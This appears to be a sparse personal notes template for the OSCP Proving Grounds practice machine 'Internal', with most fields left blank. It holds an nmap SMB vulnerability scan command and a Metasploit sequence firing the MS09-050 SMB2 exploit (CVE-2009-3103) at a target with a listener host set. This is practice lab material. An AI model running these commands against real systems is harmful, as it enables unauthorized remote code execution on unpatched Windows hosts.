## [Walkthrough](https://systemweakness.com/internal-oscp-offensive-security-proving-grounds-practice-easy-9d9152adddc0)
- Exploit/Vulnerability: 
- Hostname:
- OS: Windows
- DNS:
- Ports:


## Recon
```

nmap — script smb-vuln* -p 139,445 -oN smb-vuln-scan <IP>
```
## Enumeration

## Exploitation
1. [CVE-2009-3103](https://www.exploit-db.com/exploits/16363)
```
msfconsole
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
set RHOSTS <target-ip>
set LHOST <local-ip>
run
```

## Post Exploit

## High Value Info
### Creds:

### local.txt:

### proof.txt: 

## Reporting & Screenshots
